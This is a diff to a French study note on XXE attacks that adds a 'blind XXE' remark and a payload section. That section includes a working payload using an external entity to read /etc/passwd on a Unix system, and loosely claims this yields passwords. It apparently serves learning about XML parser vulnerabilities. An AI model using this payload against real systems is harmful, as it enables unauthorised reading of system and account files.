@@ -7,7 +7,7 @@ LES XXE attaques sont des vulnérabilités qui abusent des parsers XML et cela p
 Il y a 2 types de XXE attaques :
 
 * In-band (IB-XXE) : c'est le cas quand on a une réponse immédiate du XXE payload
-* Out of band (OOB-XXE): il n'y a pas de réponse immédiate du serveur et c'est redirigé vers un autre fichier/serveur.
+* Out of band (OOB-XXE): il n'y a pas de réponse immédiate du serveur et c'est redirigé vers un autre fichier/serveur. (Blind XXE attack)
 
 ## XML présentation
 
@@ -81,4 +81,26 @@ Ce fichier nous permet de valider les informations d'un document XML comme celui
     <heading>hacking</heading>
     <body>XXE attack</body>
 </note>
+----
+
+## XXE Payload
+
+Un payload est l'envoie d'un fichier XML (non confirmé)
+
+[source,xml]
+----
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+----
+
+Cela permet de mettre une valeur feast dans name mais on peut aussi lire les mots de passe comme ceci dans un systeme UNIX
+
+[source,xml]
+----
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
 ----
